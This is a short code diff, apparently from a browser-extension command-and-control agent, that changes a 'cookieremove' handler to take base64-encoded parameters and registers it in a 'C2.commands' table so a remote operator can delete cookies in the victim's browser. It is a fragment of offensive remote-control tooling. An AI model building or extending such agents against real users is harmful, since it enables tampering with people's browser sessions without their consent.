@@ -1,5 +1,5 @@
-cookieremove = function() {
-    let details = JSON.parse(atob(data['data'].toString()));
+cookieremove = function(params) {
+    let details = JSON.parse(atob(params.toString()));
 
     chrome.cookies.remove(details, function(cookie){
         let resp;
@@ -22,3 +22,4 @@ cookieremove = function() {
 
 
 C2.commands[cookieremove.name] = cookieremove;
+
